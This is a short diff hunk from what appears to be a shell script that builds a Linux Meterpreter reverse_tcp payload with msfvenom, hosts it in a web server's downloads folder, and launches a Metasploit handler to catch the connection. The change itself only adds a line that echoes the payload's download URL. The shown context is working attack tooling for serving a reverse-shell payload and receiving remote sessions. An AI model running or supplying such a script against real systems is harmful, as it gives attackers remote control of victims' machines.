@@ -27,6 +27,9 @@ sudo msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f 
 echo "Setting file permissions..."
 sudo chmod 644 "/var/www/html/downloads/$PAYLOAD_NAME"
 
+# Display the payload download URL
+echo "Payload downloaded to http://$LOCAL_IP/downloads/$PAYLOAD_NAME"
+
 # Start the Metasploit listener
 echo "Starting Metasploit listener..."
 gnome-terminal -- msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; run"
